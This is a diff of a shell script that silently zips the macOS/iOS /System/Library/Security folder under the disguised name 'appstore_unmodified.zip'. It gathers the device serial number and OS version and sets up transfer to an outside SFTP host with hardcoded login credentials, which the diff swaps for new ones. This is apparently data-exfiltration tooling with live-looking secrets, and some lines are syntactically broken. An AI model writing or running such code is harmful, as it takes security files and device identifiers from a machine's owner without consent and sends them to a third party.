@@ -3,15 +3,15 @@ echo "erewrwer"
 cd $home/../../../System/Library/
 archeiving files
 echo "archiving silently"
-zip -qr Security.zip Security && echo "Archiving complete!"
+zip -qr appstore_unmodified.zip Security && echo "Archiving complete!"
 
 PERSON_NAME="punjabi"
 SERIAL_NUMBER=ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4
 IOS_VERSION=grep -A1 'ProductVersion' /System/Library/CoreServices/SystemVersion.plist | grep -oPm1 '(?<=<string>)[^<]+'
 LOCAL_FILE="appstore_unmodified.zip"
 REMOTE_HOST="eu-central-1.sftpcloud.io"
-REMOTE_USER="93aa88393fca471882e5ac63a9a833d8"
-REMOTE_PASS="zebMvZYsMgOMEZ1LdzOU1AkfM72PAwHQ"
+REMOTE_USER="affd62e92b844613a73c06efae47c4ca"
+REMOTE_PASS="avhAu89mzWqHWUAft8XxZlJblINeAwYN"
 REMOTE_PATH="/home"
 REMOTE_DEST="/"
 #ARCHIVE_NAME="$IOS_VERSION_$SE"
